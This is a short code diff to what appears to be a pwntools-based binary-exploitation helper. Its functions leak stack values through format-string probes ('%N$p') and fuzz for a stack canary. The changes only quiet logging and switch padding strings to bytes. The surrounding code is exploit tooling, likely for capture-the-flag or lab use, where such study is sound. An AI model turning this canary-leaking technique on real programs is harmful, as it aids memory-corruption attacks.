@@ -122,7 +122,7 @@ def leakage_canary_value(
     leaks: List[Tuple[int, str]] = []
     for i in range(max_offset):
         try:
-            with process(str(program)) as p:
+            with process(str(program), level="error") as p:
                 p.sendline(f"%{i}$p".encode())
                 p.recvline()
                 result = p.recvline().decode().strip()
@@ -194,10 +194,10 @@ def canary_fuzz(
     deadline = None if budget_seconds <= 0 else time.monotonic() + budget_seconds
 
     if bit == 64:
-        char, test = "A", "AAAAAAAA"
+        char, test = b"A", b"AAAAAAAA"
         pack = p64
     else:  # bit == 32
-        char, test = "A", "AAAA"
+        char, test = b"A", b"AAAA"
         pack = p32
 
     # v3.1 starts at i=1 (skipping leaks[0] = the %0$p probe result
@@ -223,7 +223,7 @@ def canary_fuzz(
                         level="warning",
                     )
                     return None
-                io = process(str(program))
+                io = process(str(program), level="error")
                 attempts += 1
                 io.recv()
                 io.sendline(f"%{c}$p".encode())
